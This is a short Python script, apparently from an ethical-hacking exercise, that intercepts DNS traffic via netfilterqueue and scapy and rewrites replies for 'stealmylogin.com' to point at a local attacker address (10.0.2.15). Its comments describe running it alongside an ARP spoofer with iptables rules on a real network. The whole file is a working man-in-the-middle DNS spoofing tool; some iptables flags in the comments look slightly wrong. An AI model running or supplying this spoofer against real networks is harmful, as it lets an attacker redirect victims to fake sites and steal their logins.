#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 


#if tested on a real network:
#   -launch arp spoofer
#   -set iptables as follow: iptables -i forward -j nfqueue --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#set the iptables as follow to test on local machine test on local machine
#iptables -i output -j nfqueue --queue-num 0
#iptables -i input -j nfqueue --queue-num 0


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "stealmylogin.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

